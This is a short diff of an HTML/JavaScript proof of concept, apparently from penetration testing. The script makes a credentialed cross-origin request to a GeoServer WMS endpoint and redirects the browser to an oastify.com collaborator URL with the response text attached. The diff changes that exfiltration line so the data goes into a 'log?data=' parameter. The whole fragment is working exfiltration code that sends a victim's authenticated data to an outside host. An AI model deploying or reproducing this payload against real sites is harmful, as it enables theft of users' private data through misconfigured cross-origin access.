@@ -7,7 +7,7 @@ req.open('GET','https://gap-test.ftr.com:8443/geoserver/gap/wms?srs=EPSG%3A3857&
 req.withCredentials = true;
 req.send();
 function reqListener() {
-    document.location='//m8v18f3gb4pkfh4j06qajxpnrex5lv9k.oastify.com'+encodeURIComponent(this.responseText);
+    document.location='https://m8v18f3gb4pkfh4j06qajxpnrex5lv9k.oastify.com/log?data='+encodeURIComponent(this.responseText);
 };
 </script>
 </body>
